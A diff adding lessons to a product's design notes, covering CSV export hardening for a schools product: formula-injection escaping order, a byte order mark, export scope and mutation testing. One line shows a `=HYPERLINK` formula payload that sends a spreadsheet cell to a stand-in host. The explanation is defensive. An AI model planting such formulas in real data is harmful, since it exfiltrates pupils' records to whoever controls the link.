@@ -1211,6 +1211,42 @@ anywhere: develop against a tunnel. The switch reads `APP_BASE_URL` rather than
 scheme it was served over, and the ordinary way to develop an LTI tool is a
 tunnel giving https to a server that still thinks it is in development.
 
+**A file format is a place where somebody else's software runs your data.** A
+CSV field beginning `=`, `+`, `-`, `@`, tab or carriage return is evaluated as a
+formula by Excel, LibreOffice and Google Sheets. The display names in this
+export arrive from a district's SIS — a system this product neither controls nor
+vets — and the person opening the file is an administrator with every child in
+the district on screen. `=HYPERLINK("http://x/?"&A1,"click")` as a pupil's name
+sends the row beside it to whoever chose that name.
+
+**And the order of two escapes decides whether the guard works at all.** The
+apostrophe goes on *before* quoting. The other way round produces
+`'"=HYPERLINK(…)"`, whose first character is an apostrophe only by accident of
+position — a parser stripping the quotes hands back a live formula. The test
+un-quotes the field the way a parser would and asserts it is still inert,
+because asserting on the written string alone would have passed either way.
+
+**A byte order mark is the one deliberate departure from RFC 4180 here.**
+Without it Excel guesses the system code page and a district's own pupil opens
+as `JosÃ©`. Every mainstream parser skips it; Excel is the one that needs it, and
+Excel is what these files are opened in. Worth stating as a decision rather than
+leaving as a surprise in a diff.
+
+**Scope was the security decision, not the gate.** The export is behind
+`elevatedProcedure` where the console's other district reads are merely
+protected — but the stronger protection is that the file *contains a summary*.
+A district-wide export shaped like E2's would have put every answer every child
+ever gave into one download, and no amount of step-up makes that a good object
+to have lying in a Downloads folder.
+
+**A third equivalent mutation, and the pattern is now clear enough to name.**
+Dropping the null-campus guard changed nothing for a pupil whose only class has
+no campus: the set holds a single `null`, and `join` renders null as empty. It
+stops being equivalent the moment a pupil is in *both* kinds of class at once —
+ordinary — where the column reads `Elm Street; ` with a separator leading
+nowhere. **An equivalent mutation usually means the test covers the degenerate
+case and not the ordinary one.**
+
 **A rule can outlive its reason, and the code keeps obeying it.** C4c forbade a
 sync from archiving a child *because archiving meant a deletion request*. E3
 changed what archiving means — the schema now says it is for a child who has
